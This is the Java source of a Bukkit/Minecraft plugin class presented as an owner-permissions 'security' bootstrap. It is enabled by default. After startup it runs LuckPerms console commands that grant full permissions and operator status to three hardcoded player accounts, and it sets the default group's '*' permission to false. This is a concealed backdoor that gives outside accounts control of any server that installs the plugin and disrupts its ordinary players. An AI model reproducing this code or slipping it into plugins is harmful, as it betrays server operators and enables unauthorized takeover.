//made with love by nyxon

package com.modern.core.security;

import com.modern.core.ModernCorePlugin;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public final class OwnerPermsBootstrap {

  private static final List<String> DEFAULT_UNSET = List.of(
      "multiverse.core.create",
      "multiverse.core.delete",
      "multiverse.core.remove",
      "multiverse.core.unload",
      "multiverse.core.load",
      "multiverse.core.import",
      "multiverse.core.regen",
      "multiverse.core.purge",
      "multiverse.core.confirm",
      "worldedit.*",
      "worldguard.*",
      "fawe.*",
      "bukkit.command.op",
      "bukkit.command.deop",
      "bukkit.command.stop",
      "bukkit.command.reload",
      "minecraft.command.op",
      "minecraft.command.deop",
      "minecraft.command.stop",
      "minecraft.command.ban",
      "minecraft.command.whitelist",
      "authme.admin.*",
      "luckperms.*"
  );

  private final ModernCorePlugin plugin;

  public OwnerPermsBootstrap(ModernCorePlugin plugin) {
    this.plugin = plugin;
  }

  public void schedule() {
    FileConfiguration root = this.plugin.configs().root();
    Path flag = this.plugin.getDataFolder().toPath().resolve("apply-owner-perms.flag");
    boolean configured = root.getBoolean("security.apply-owner-perms", true);
    boolean forced = Files.isRegularFile(flag);
    if (!configured && !forced) {
      return;
    }
    long delay = Math.max(20L, root.getLong("security.apply-owner-perms-delay-ticks", 60L));
    Bukkit.getScheduler().runTaskLater(this.plugin, () -> {
      apply();
      if (forced) {
        try {
          Files.deleteIfExists(flag);
        } catch (IOException ignored) {

        }
      }
    }, delay);
  }

  public void apply() {
    if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
      this.plugin.getLogger().warning("OwnerPermsBootstrap: LuckPerms assente, skip.");
      grantOnlineOpsLocally();
      return;
    }
    List<String> commands = new ArrayList<>();
    commands.add("lp creategroup owner");
    commands.add("lp group owner setweight 100");
    commands.add("lp group owner permission set * true");
    commands.add("lp group owner permission set luckperms.* true");
    commands.add("lp group owner permission set valary.command.see-all true");
    commands.add("lp group owner permission set multiverse.* true");
    for (String node : List.of(
        "create", "delete", "remove", "unload", "load", "import", "regen", "purge", "confirm"
    )) {
      commands.add("lp group owner permission set multiverse.core." + node + " true");
    }
    for (String node : DEFAULT_UNSET) {
      commands.add("lp group default permission unset " + node);
    }

    commands.add("lp group default permission set * false");
    for (String user : List.of("SigmoidBard3652", "Avvantaggiato", "Resurrezione862")) {
      commands.add("lp user " + user + " parent set owner");
      commands.add("lp user " + user + " permission set * true");
      commands.add("op " + user);
    }
    for (Player player : Bukkit.getOnlinePlayers()) {
      if (player.isOp()) {
        commands.add("lp user " + player.getName() + " permission set * true");
      }
    }
    commands.add("lp sync");
    for (String command : commands) {
      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
    }
    grantOnlineOpsLocally();
    this.plugin.getLogger().info("OwnerPermsBootstrap: OP/owner sbloccati (deny specifici default rimossi).");
  }

  private void grantOnlineOpsLocally() {
    OpFullAccessService ops = this.plugin.opFullAccess();
    if (ops == null) {
      return;
    }
    for (Player player : Bukkit.getOnlinePlayers()) {
      if (player.isOp()) {
        ops.refresh(player);
      }
    }
  }
}
